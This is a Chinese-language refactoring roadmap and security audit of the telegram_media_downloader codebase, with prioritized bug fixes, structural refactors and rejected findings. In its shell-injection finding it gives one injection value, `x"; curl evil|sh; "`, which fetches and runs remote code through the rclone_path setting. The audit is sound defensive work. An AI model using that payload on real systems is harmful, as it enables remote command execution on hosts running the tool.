# telegram_media_downloader 重构路线图

## 一、总体架构判断

这个代码库的核心病灶不是"文件太大"，而是**引擎、bot、web 三层之间没有任何边界，状态没有唯一所有者**：全局单例在 import 时构造（`media_downloader.py:231` 构造 Application + 队列，`app.py:451` 在 `__init__` 里换事件循环、开线程池），`media_downloader` ↔ `bot.py` 靠 `sys.modules` 自别名 hack（`media_downloader.py:17`）加 8 处函数内懒 import 维持双向依赖。其直接后果是一类反复出现的"分裂脑"bug：写进 A、读的是 B——watchdog 读的心跳字典和进度回调写的是两个同名不同物的 dict（`media_downloader.py:59` vs `download_stat.py:10`），bot 配置 dump 到一个叫 `d` 的垃圾文件（`bot.py:169`），web 读一个不存在的变量名直接 500（`web.py:294`）。第二病灶是**完成语义靠计数器轮询而非显式信号**（`media_downloader.py:1917/2096`），计数器本身又有双记和漏记，批任务会永久挂起或提前退出。第三病灶是测试量巨大（5052 行）但打在替身和精确 UI 文案上，核心 worker/重试/watchdog 路径反而零覆盖。

---

## 二、立即可做的高收益重构（按优先级）

### P0：正在破坏核心功能或构成安全漏洞的（全部 S 规模，建议一周内清完）

**1. 修复 watchdog 心跳分裂脑 —— 所有超过 10 分钟的下载都会被误杀**
- **问题**：`media_downloader.py:59-60` 定义了自己的 `DOWNLOAD_LAST_PROGRESS_TS/BYTES`，而进度回调（`media_downloader.py:1092` 挂的 `update_download_status`）只写 `download_stat.py:10-11` 那份同名 dict。`_stall_watchdog`（`media_downloader.py:879-894`）读本地那份，永远看不到真实进度 → 任何单次尝试超过 `STALL_TIMEOUT=600s`（:235）的下载被当作卡死取消，重试 3 次后标记 FailedDownload。大视频系统性无法下完。
- **怎么改**（最小修法，不是重构）：删掉 `media_downloader.py:59-60` 的重复 dict，在第 36 行现有 import 里从 `module.download_stat` 导入这两个名字。顺手修暂停交互：在暂停循环（`download_stat.py:109-112`）每轮刷新 `DOWNLOAD_LAST_PROGRESS_TS[message_id]`，或让 watchdog 在 `get_download_state() == StopDownload` 时 `continue`——否则修完分裂脑后，暂停超过 10 分钟会被 watchdog 全灭。
- **风险/验证**：几行改动，风险极低。加一个回归测试：通过 `update_download_status` 写入心跳后断言 watchdog 不取消。按 message_id（而非 (chat_id, message_id)）键控的问题留 TODO，不在本次动进度回调签名。

**2. download_task 的宽 except 破坏 finish 计数不变量 —— 非 bot 运行永久挂起 + 消息被永久静默跳过**
- **问题**：`media_downloader.py:791-798` 的 `except Exception` 只做 `failed_download_task += 1`，不调 `set_download_id`（finish_task 唯一递增点在 `app.py:1034`）也不写 `node.download_status`。`run_until_all_task_finish`（:2315-2326）要求 total==finish 才退出 → 一个逃逸异常让非 bot 运行永不结束；同时该消息既不进 download_status 也不进 ids_to_retry，而 last_read_message_id 照常推进——以后每次运行都跳过它，无任何报错。
- **怎么改**：在现有 except 分支内（不要改成 finally 重构）：若 `message_id not in node.download_status`，则写入 `DownloadStatus.FailedDownload`、调 `node.stat(...)`（替换手工 `failed_download_task += 1` 防双记）、非 bot 时调 `app.set_download_id(...)`。`not in download_status` 守卫防止异常发生在成功簿记之后（如 upload 阶段）时二次递增 finish_task。约 8 行。
- **风险/验证**：注意双记路径（:720 已 stat 后 :791 再 +1 是既有 bug，此修法一并消除）。测试：stub 一个在 download_media 前抛异常的消息，断言 run_until_all_task_finish 正常退出且该 id 进入 ids_to_retry。

**3. web `/get_download_list` 每次调用 NameError 500**
- **问题**：`web.py:294` 迭代 `download_result.items()`，但模块里根本没有这个名字——只 import 了 `get_download_result`（:19）且从未调用。带 `already_down` 参数的请求（自带 UI 就带）全部 500，web 下载列表自某次重命名后一直是死的。
- **怎么改**：在 `download_stat.py` 让 `get_download_result()` 返回浅拷贝快照 `{chat_id: msgs.copy() for ...}`（dict.copy 是 C 级操作，GIL 下安全，避免 Flask 线程迭代事件循环正在改的热 dict），web 端调用它。不上锁、不做 run_coroutine_threadsafe——单用户本地工具不需要。
- **验证**：一个 Flask test-client 冒烟测试：预置数据后断言 200。这个端点此前零测试，正是它烂了没人发现的原因。

**4. bot 配置持久化整体失效：dump 到字面量文件 `d`，/add_filter 写进不存在的属性**
- **问题**：`bot.py:169` `open("d", "w")` dump 配置（每次关停经 :396 执行），启动却从 `self.config_path` 读（:232-237）——bot 设置的过滤器全部丢失，cwd 里留一个垃圾文件 `d`。`/add_filter`（:589）校验通过后存进 `_bot.app.down`——grep 全库无任何其他 `.down` 引用，纯黑洞，但用户收到"成功"回复。
- **怎么改**：约 5 行。(1) `update_config` 写 `self.config_path`；(2) `:589` 改为 `_bot.download_filter = args[1]`（这是 `assign_config` 实际加载的字段，:161），删除 `app.down` 赋值；(3) 加一个往返测试：断言 download_filter 写进 config_path 且不产生名为 `d` 的文件。不做"Application 统一配置所有权"重构。

**5. rclone_path / 文件名进入 shell=True 命令 —— 认证后的 web 用户可任意命令执行**
- **问题**：`web.py:554-557` 把 `rclone_path` 原样写入配置；`cloud_drive.py:62-64` 和 :121-124 用 f-string 拼 shell 命令并 `shell=True` 执行（:66, :126）。`x"; curl evil|sh; "` 即可逃逸。Telegram 提供的文件名也进 shell，而 `validate_title`（`format.py:275-277`）不过滤 `; $ \` &`。
- **怎么改**：两个调用点改参数列表：`Popen([rclone_path, "mkdir", f"{remote_dir}/"], ...)` 和 `asyncio.create_subprocess_exec(rclone_path, "copy", file_path, ...)`；web 端拒绝非 `os.path.isfile + os.access(X_OK)` 的 rclone_path。改成 exec 风格后文件名成为惰性参数，不需要再做文件名消毒工程。
- **验证**：不到一小时。跑一次真实 rclone 上传确认 stdout 解析不变。

**6. 锁定 pyrogram fork 到具体 commit**
- **问题**：`requirements.txt:2` 装的是 `tangyoha/pyrogram` 的 `heads/patch.zip`——未版本化的分支头，fork 任何一次 push 都可能打断全新安装或悄悄改变被 `pyrogram_extension.py:1449-1511` 复制的 connect/start 序列。
- **怎么改**：一行——改成 `archive/<sha>.zip`。另在 `pyrogram_extension.py`、`send_media_group_v2.py`、`get_chat_history_v2.py` 头部各加一行注释标明 vendored 代码复制自哪个 pyrogram 版本。**不要**重写 cache_media 的分支或用 `asyncio.wait_for` 替换 HookClient——那是稳定运行的继承代码，动它是纯风险。

**7. aligo 上传分支必然 TypeError + 死掉的 CloudDrive.upload_file**
- **问题**：`app.py:723-728` `run_in_executor(self.executor, CloudDrive.aligo_upload_file(...))`——同步函数被内联执行（阻塞事件循环），bool 返回值被当 callable 提交，await 时 TypeError。写对的那份 `cloud_drive.py:222-253` 零调用者（生产唯一调用是 `media_downloader.py:761` 的 app.upload_file）。
- **怎么改**：删死代码 `CloudDrive.upload_file`；`app.py:723` 改 `functools.partial(...)`——或者鉴于 aligo 已从 requirements.txt 注释掉，直接删整个 aligo 分支。二选一，10 分钟。

**8. download_comments 静默吞掉扫描失败并永久泄漏 active TaskNode**
- **问题**：`media_downloader.py:2212-2215` 的 `except ValueError: return` / `except Exception: return` 无日志无清理，绕过了 :2225-2235 那个已经会 report_bot_status + remove_active_task_node 的外层 handler。坏链接/无权限时命令凭空消失，节点留在全局 active 注册表里直到重启，用户的回复消息永远显示"进行中"。
- **怎么改**：删掉这两个内层 except，让异常落到外层。如果 ValueError 需要单独的用户提示，显式 report 后走同一条清理路径。

### P1：数据安全与健壮性（本轮之后立刻做）

**9. update_config 加锁 + 原子写 + 快照迭代**（S/M）
- **问题**：`app.py:911-917` 对 config.yaml/data.yaml 截断重写，无 temp+rename、无锁；Flask 线程（`web.py:577`）和主线程关停（`media_downloader.py:2894`）并发调用；`app.py:869` 迭代的 `download_status` 正被 asyncio worker 改（`media_downloader.py:574, 716`）→ 保存设置时可能 `dictionary changed size during iteration`，崩溃/断电中途写则留下截断 YAML（内含 api_id/api_hash 和全部下载历史），下次启动直接拒绝运行（:1236-1238）。
- **怎么改**：只做安全的那一半——模块级 `threading.Lock` 包住序列化+写入；迭代前 `list(value.node.download_status.items())` 快照（ids_to_retry 同理）；同目录 tempfile + `os.replace` 写两个 YAML。**不做** `.bak` 回退和声明式 settings 表——接受 `_apply_settings` 的三处重复直到设置页再次膨胀。
- **验证**：并发压测：一边下载一边循环保存设置，无异常无损坏文件。

**10. 在自然静止点持久化进度，而不是只在干净退出时**（S，依赖第 9 项）
- **问题**：grep 确认 `app.update_config` 运行时只有两个调用点：`media_downloader.py:2894`（main 的 finally）和 `web.py:577`（保存设置）。kill -9/OOM/断电丢掉整轮 last_read_message_id / ids_to_retry；bot 模式下可能是几天的状态。
- **怎么改**：在 `run_until_all_task_finish`（~:2317）每完成一个 chat 后调用一次 update_config。**不做 60 秒定时器**——定时器会在 download_status 正被改的时刻写盘，风险大于收益。前置条件是第 9 项的原子写已就位（写盘频率会大幅上升）。

**11. chat 恢复状态按 chat_id 而非位置索引写入**（S）
- **问题**：`app.py:857-888` 用递增 idx 把 dict 遍历结果对位写进 `config['chat'][idx]`，假设 dict 插入序与两份 YAML 列表永远一致；`assign_config`（:601-616）会跳过缺 chat_id 的条目、折叠重复 chat_id 使 idx 失步；web 设置又会在运行时 append（`web.py:449-453`）。失步的后果是 A 频道的 last_read_message_id 静默写进 B 频道——消息被跳过或整体重下，无报错。
- **怎么改**：照搬 `web.py:429-431` 已有的模式，构建 chat_id→entry 映射后按 chat_id 匹配写入，缺失时 append 新条目；`assign_config` 折叠重复 chat_id 时打 warning。**不做**把恢复状态整体迁到 data.yaml 的大手术。

**12. FloodWait 遵守服务器给的等待时间**（S）
- **问题**：`media_downloader.py:1145-1147` 捕获 FloodWait 后直接返回 FailedDownload——唯一自带重试指导的错误被立即判死，而普通 ServerError/ConnectionError 反而会退避重试（:1174-1186）。flood 窗口期整批任务连环失败，worker 还在继续锤 Telegram 加重 flood。另外 `_check_timeout`（:280-294）硬编码 `retry == 2` 与 `MAX_RETRIES = 3`（:1022）双头记账。
- **怎么改**：FloodWait 分支在 `wait_err.value` 低于上限（300-600s）时 `await asyncio.sleep(value + 1); continue` 并计入重试预算；超上限维持 FailedDownload（ids_to_retry 兜底），避免一个 worker 被钉一小时。`retry == 2` 改 `retry >= MAX_RETRIES - 1`。

**13. 区分 watchdog 取消与外部取消**（S）
- **问题**：`media_downloader.py:1123-1129` 把所有 CancelledError 当作卡死重试，假设只有 watchdog 会 cancel；但关停会 cancel worker（:2889），worker 自己的 `except CancelledError: raise`（:1364-1367）永远轮不到。当前危害是潜伏的（关停后 loop 不再跑），但第一个真正的运行中取消路径出现时会静默产生重复下载。
- **怎么改**：watchdog 在 `target_task.cancel()` 前置位 `STALLED.add(message_id)`；except 分支 pop 该标志，有则重试，无则 log 后 re-raise。约 10 行，不动关停序列。

**14. TaskNode 声明全部字段 + 按消息快照命名上下文**（S/M）
- **问题**：`package_plan/package_media_items/last_progress_report` 在 `TaskNode.__init__`（`app.py:117-192`）里不存在，靠 `bot.py:2568`、`media_downloader.py:2162`、`download_stat.py:196` 外部 setattr；消费方全是防御性 getattr/hasattr（`media_downloader.py:492-524` 等）。更严重的是 `download_prescan_packages`（:2144-2178）逐包改写**同一个** parent_node 的命名上下文，唯一的串行化保障是那套会提前退出的计数器轮询——掉队消息会被按下一个包的上下文命名。
- **怎么改**：(1) 三个字段在 `__init__` 里声明为 None，顺手删 getattr 守卫——15 分钟零行为变化。(2) 修竞态用快照而非重构：入队时把解析好的 PackageMediaItem/命名上下文附着到队列条目（扩展 tuple 或按 (chat_id, msg_id) 存 per-message dict），`_get_media_meta` 读快照而不是活的 `node.package_naming_context`。**不做** `__slots__`、naming_override 钩子、子 TaskNode。

### P2：web 安全收尾 + 卫生（可与 P1 并行）

**15. 删掉 AES 登录剧场**（S）：`login.html:36-42` 硬编码 key/IV 在浏览器加密，`web.py:43` 用逐字节相同的 key 解密——key 随页面下发，对线上观察者零保密性，还搭上 576K/55 文件的 vendored crypto-js（`module/static/aes/crypto-js-master`）和无校验的 PKCS7 unpad（`crypto.py:57-59`）。改为密码明文 POST，靠已有的 `hmac.compare_digest`（`web.py:215`）；删 `utils/crypto.py` 的 AesBase64 和整个 crypto-js 目录。**不改** `web_host=0.0.0.0` 默认值（会打断 Docker/局域网部署），改为在文档中说明 web UI 是纯 HTTP、暴露时应挂反代或绑回环。

**16. 登录限速**（S）：`web.py:200-224` 无任何尝试计数/延迟/锁定，配合 0.0.0.0 默认绑定，弱 web_login_secret 可被无限在线爆破。加模块级 per-remote_addr 失败计数 dict，5 次后指数退避（上限 ~5 分钟），成功重置。~20 行，无新依赖。**不做**密码哈希——`.web_auth.json` 明文正是凭据的交付机制，且 config.yaml 本身就明文存着 api_hash/bot_token。

**17. CSRF：一行 `SESSION_COOKIE_SAMESITE="Strict"`**（S）：`web.py:36` 目前 Lax，POST `/api/settings`（:584）、`/set_download_state`（:260）无 token。同源单用户 UI 用 Strict 即可，**不引入 flask-wtf**。顺手把 `web.py:33` 的 `secret_key = "tdl"` 常量删掉换成持久化随机值——注意它实际已被 `_ensure_web_auth` 在启动时覆盖（见第四节），所以这只是防回归卫生，不是紧急漏洞。

**18. pending 工作流字典加 TTL 清扫**（S）：`bot.py:105-108` 四个 dict 里三个存完整扫描 Message 列表（prescan 上限 5000 条），只在 confirm/cancel 时 pop；`created_at`（:690）写了从没读过。给三个缺时间戳的 dict 补上，在既有 3 秒 `update_reply_message` 循环里清扫 30-60 分钟以上的条目。~30 行加一个测试。

**19. 删除生产不可达的命名策略 A/B/D**（S/M）：两个回调 handler 都拒绝非 RECOMMENDED（`bot.py:2482, 2621`），`build_naming_previews`/`build_package_naming_previews`（`comment_workflow.py:711/750`）零非测试调用者，~130 行逻辑 + 一大片测试纯靠测试保活。删枚举成员、策略分支、两个死预览构建器及其测试；删完确认 `parse_callback_data` 对聊天里可能残存的旧内联键盘 payload（含 "A"/"B"/"D"）是干净拒绝而不是抛未知枚举异常。

---

## 三、结构性重构（分阶段，每步保持可运行）

### R1：解开 media_downloader ↔ bot 循环依赖（M，约 1 天）
现状：`media_downloader.py:17` 的 `sys.modules` 自别名 hack 存在的唯一理由，是让 bot.py 的 8 处函数内 `from media_downloader import ...`（:1017, 1140, 1331, 1716, 2412, 2541, 2571, 2671——每加一个功能加一条）解析到运行中的模块；从其他入口 import 会得到第二个模块实例、第二套 Application/事件循环/队列，bot 入队的东西没有 worker 读。

分步（每步可运行）：
1. 新建 `module/engine_hooks.py`：一个普通 registry dict。这是对既有注入模式的延伸——main() 本来就在 `media_downloader.py:2861` 把 `add_download_task` 注入 `start_download_bot`。
2. media_downloader 启动时注册 8 个函数（scan_comment_range、download_prescan_packages 等）。
3. bot.py 逐处把懒 import 换成 registry 调用（8 个独立小 commit，随时可停）。
4. 全部换完后删 `sys.modules` hack。
5. **推迟**把 import 时的 Application/队列构造移进 main()——除非它真的挡住了什么。测试的 `rest_app()` fixture（`test_media_downloader.py:90-124`）也不动，重写 ~6700 行测试 fixture 的回归风险大于收益。

### R2：合并 download_prepared_* 并替换计数器轮询（M→L，分两步）
现状：`download_prepared_comments`/`download_prepared_messages` 是 ~150 行的分叉复制（内联同名 `TempChatDownloadConfig`：:1850 vs :1996；同款 5 秒轮询 `success+failed+skip >= expected`：:1917 vs :2096），且已经漂移——messages 版有 download_status 记录和 baseline 修复（:2060-2072），comments 版没有（:1898-1913）。计数器本身双记（:720 stat 后 :791 再 +1）又漏记（skip_not_found 路径 :673-683 不进轮询求和）→ 挂死和提前退出都真实可达；提前退出正是第 14 项 prescan 命名竞态的触发器。

分步：
1. **（低风险，先做）**合并为一个 `_download_prepared(items, node, download_filter, failed_ids)`，始终记录 download_status 并调 node.stat；`TempChatDownloadConfig` 提升为模块级。删 ~150 行，止住漂移，**保留现有轮询**。P0 第 2 项的双记修复要先落地。
2. 把轮询换成显式完成信号：per-node pending 计数器，入队 +1，`download_task` 的 finally 及每条 worker 提前返回/跳过路径 -1，归零时 set 一个 `asyncio.Event`；调用方 `await asyncio.wait_for(node.done, timeout)`——生产挂死变成有日志的超时，测试从"booby-trap asyncio.sleep 检测死循环"（`test_comment_workflow.py:1379-1394`）变成 await 真实完成。**不做** per-item future 设计——它要重写 add_download_task/worker 契约，收益为零。

### R3：Discord 监控器从 main() 中提取（M，约半天）
现状：~460 行功能以嵌套闭包形式活在 main()（`media_downloader.py:2364-2826`）里，用 `yaml.safe_load` 二次读 config.yaml（:2365-2369）绕过 Application/ruamel——`monitor` 配置节对 Application、web /api/settings、校验全部不可见；finally（:2883-2887）引用可能未绑定的 `enabled`/`webhook_session`，NameError 被裸 except 吞掉。

分步：闭包原样搬进 `module/monitor.py`，暴露 `setup(app, client) -> (fallback_loop, stop)`；`enabled=False`/`webhook_session=None` 模块级初始化；monitor 节改在 `Application.assign_config` 解析使其能被 update_config 保存。**先确认这个功能还在用**再投入超出提取的工作量；不给它做 web 设置 UI。

### R4：批量扫描去重（M）
现状：分批 get_messages + 逐条回退 + missing-streak 逻辑独立实现了三遍（`media_downloader.py:1459-1596, 1648-1688, 1774-1823`），且已分叉：只有 prescan 处理 FloodWait，只有 comment 扫描查 discussion-thread 成员资格——意味着被用得最多的 comment 扫描器遇到限流就直接失败，修了也不传播。同一段 `sorted([m for m in messages if ...])` 过滤器逐字出现在 `comment_workflow.py:274, 382` 和 `prescan_workflow.py:77`。

分步：
1. **10 分钟纯赚**：提取 `sorted_candidates(messages, start_id)`，三处复用。
2. 在 `pyrogram_extension.py` 加异步生成器 `iter_message_batches(client, chat_id, ids, *, batch_size=50, flood_wait_sleep=None)`，负责分块、非 list 结果归一化、批量失败回退逐条、FloodWait 睡眠重试，每批 yield `(batch_ids, fetched, failed_ids)`。**不做**返回整表的统一函数——三个扫描器各有不同的中途早停条件（expected_comment_count / plan 完整性 / streak），早停逻辑留在各自循环体里（每个从 ~150 行缩到 ~30-50 行）。三个扫描器逐个迁移，每个一个 commit。

### R5：测试补强与拆分（M，穿插进行）
1. **先补特征化测试，再谈重构**（针对零覆盖的 worker/重试/watchdog：唯一的 worker 测试整段被注释，`test_media_downloader.py:1685-1693`）：~4 个测试——worker 消费两条消息断言队列排空和计数器；download_media 钉住 BadRequest→refetch、FloodWait→当前行为、stall-cancel→重试。用小型专用 stub，别扩魔法 id 的 MockClient（tests:237-341）。P1 第 12 项改 FloodWait 行为前必须先有这个。
2. **给真实 get_extension 补 ~40 行直测**：现在整个 1697 行套件类级 patch 掉了它（`test_media_downloader.py:354-355`），断言打在 `test_common.py:140-203` 一份手工维护的平行实现上（且已漂移：假货硬编码 `guessed_extension=""`）。用 `pyrogram.file_id.FileId(...).encode()` 在测试内合成真 file_id，覆盖 photo/video/document-with-mime/voice/空值/未知类型。**保留**类级 patch 和 mock 层级不动。
3. **按既有类边界拆 5052 行的 test_comment_workflow.py**：CommentScanExecutionTestCase（:1189 起，测的其实是 media_downloader）挪进 tests/test_media_downloader.py；prescan 两个类挪 test_prescan_workflow.py；两个 bot 工作流类挪 test_bot_comment_workflow.py；共享 Mock 进 comment_fixtures.py。纯文件搬迁，不改测试逻辑。**不做** plan/render 分层 + snapshot 测试基建——comment_workflow 其实已经是 dataclass 规划 + 渲染消费的结构，等下次文案改动真的打崩几十个断言时，再就地删冗余 assertIn。

---

## 四、明确不建议做的（来自被驳回的发现，教训本身有价值）

**1. "secret_key='tdl' 可伪造 session 完全绕过认证" —— 看似漏洞，实际已有缓解。** 事实全对（`web.py:33` 确实是常量，`app.py:432` 确实默认 0.0.0.0），但因果链断了：唯一的服务启动路径 `init_web`（`media_downloader.py:2831` → `web.py:164`）在起 Flask 线程**之前**调 `_ensure_web_auth`，`web.py:158` 已把 key 替换成 `secrets.token_urlsafe(32)`——没有任何路由在 "tdl" 下被服务过。教训：审计报警前先追启动序列；常量本身作为卫生问题顺手删（见 P2-17），但不值得当漏洞抢修。

**2. "bot.py 2730 行零测试、_bot 全局设计不可测" —— 前提为假。** `tests/module/test_comment_workflow.py` 的 102 个测试 import module.bot ~72 次，通过 patch `_bot` 直接测 download_from_link、parse_link、各回调 handler。教训：覆盖率要按 import 图判断，不能按测试文件名判断——这也正是第三节 R5-3 要拆文件的理由（覆盖存在但不可见）。

**3. "单个状态 reaper 循环无守卫，一个异常杀死全部状态上报" —— 防御其实已经在了。** `update_reply_message` 里唯一 await 的 `report_bot_status` 吞掉所有异常（`pyrogram_extension.py:861-867`），`is_finish` 是纯算术（`app.py:204-214`），copy() 与 pop() 之间无 await 所以"竞态"在单事件循环下不存在；reaper 在关停时也确实被 cancel（`bot.py:398-399`）。教训：单事件循环 + 全吞异常的组合让很多"并发恐慌"不成立——真正的问题在别处（fire-and-forget 的异常不上报，已由 P0-8 的具体案例覆盖）。

**此外，验证过程中主动砍掉的过度设计**（原始建议里有、复核后判定成本大于收益的）：web_host 默认值改 127.0.0.1（打断 Docker 部署）、`_apply_settings` 声明式 settings 表、cache_media 4×4 分支的表驱动重写、HookClient connect/start 的 wait_for 替换、web 密码加盐哈希、flask-wtf CSRF token、per-item download future、TaskNode `__slots__`/子节点树、恢复状态迁移 data.yaml。这些共同的模式是：**给单维护者的存量工作代码引入新抽象，而问题本身用 5-30 行就能封住。**

---

## 五、建议执行顺序总表

| 阶段 | 项目 | 规模 |
|---|---|---|
| **阶段 0（本周，全是止血）** | P0-1 watchdog 心跳分裂脑（含暂停交互） | S |
| | P0-2 download_task except 补齐终态簿记 | S |
| | P0-3 /get_download_list NameError + 快照 | S |
| | P0-4 bot 配置写 `d` 文件 + /add_filter | S |
| | P0-5 rclone shell 注入 → 参数列表 | S |
| | P0-6 pin pyrogram fork commit | S |
| | P0-7 aligo TypeError + 删死代码 | S |
| | P0-8 download_comments 删两个吞异常 except | S |
| **阶段 1（数据安全）** | P1-9 update_config 锁 + 原子写 + 快照 | S/M |
| | P1-10 chat 完成边界持久化（依赖 9） | S |
| | P1-11 chat_id 键控替代位置索引 | S |
| | P1-12 FloodWait 遵守等待 + 统一 MAX_RETRIES（先做 R5-1 特征化测试） | S |
| | P1-13 STALLED 标志区分取消来源 | S |
| | P1-14 TaskNode 字段声明 + 命名快照 | S/M |
| **阶段 2（安全收尾+卫生，可与阶段 1 并行）** | P2-15 删 AES/crypto-js | S |
| | P2-16 登录限速 | S |
| | P2-17 SameSite=Strict + secret_key 常量清理 | S |
| | P2-18 pending dict TTL 清扫 | S |
| | P2-19 删命名策略 A/B/D | S/M |
| **阶段 3（结构性）** | R5-1 worker/重试特征化测试（阶段 1 前置项，实际最早做） | S/M |
| | R1 engine_hooks 注册表，删 sys.modules hack | M |
| | R2-1 合并 download_prepared_* | M |
| | R2-2 pending 计数器 + Event 完成信号 | M/L |
| | R4-1 sorted_candidates 提取 | S |
| | R4-2 iter_message_batches + 三扫描器迁移 | M |
| | R3 Discord monitor 提取（先确认还在用） | M |
| | R5-2 get_extension 真测 | S |
| | R5-3 拆 test_comment_workflow.py | M |

关键依赖：R5-1（特征化测试）在 P1-12 和 R2 之前；P1-9（原子写）在 P1-10 之前；P0-2（双记修复）在 R2-1 之前；R2 全部完成后，P1-14 的 prescan 命名竞态才算彻底关闭（快照方案在此之前提供保底）。